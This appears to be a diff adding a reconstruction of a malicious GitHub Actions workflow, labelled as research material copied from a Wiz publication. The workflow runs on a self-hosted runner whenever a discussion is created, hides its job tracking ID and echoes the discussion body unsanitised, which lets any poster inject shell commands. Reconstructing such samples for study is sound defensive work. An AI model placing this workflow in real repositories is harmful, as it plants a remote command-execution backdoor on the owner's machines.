@@ -1,0 +1,13 @@
+# wormsign replay: inert reconstruction, not a sample. Text as Wiz published it; see README.md.
+name: Discussion Create
+on:
+  discussion:
+jobs:
+  process:
+    env:
+      RUNNER_TRACKING_ID: 0
+    runs-on: self-hosted
+    steps:
+      - uses: actions/checkout@v5
+      - name: Handle Discussion
+        run: echo ${{ github.event.discussion.body }}
